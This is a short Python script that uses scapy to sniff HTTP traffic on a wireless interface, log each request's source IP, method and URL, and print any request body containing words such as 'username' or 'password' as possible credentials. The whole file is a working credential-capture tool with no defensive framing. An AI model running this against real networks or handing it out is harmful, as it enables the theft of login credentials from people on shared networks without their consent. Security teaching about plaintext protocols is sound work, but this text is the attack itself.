from scapy.all import sniff, Raw, IP
from scapy.layers import http
from colorama import init, Fore


init()

def sniff_packet(iface):
    sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        ip = packet[IP].src
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        method = packet[http.HTTPRequest].Method.decode()

        print("[+]", ip, method, url)

        if packet.haslayer(Raw):
            load = packet[Raw].load.decode()
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(f"{Fore.RED}[*] Possible credentials: {load}{Fore.RESET}")
                    break

if __name__ == "__main__":

    INTERFACE = "wlan0"

    sniff_packet(INTERFACE)
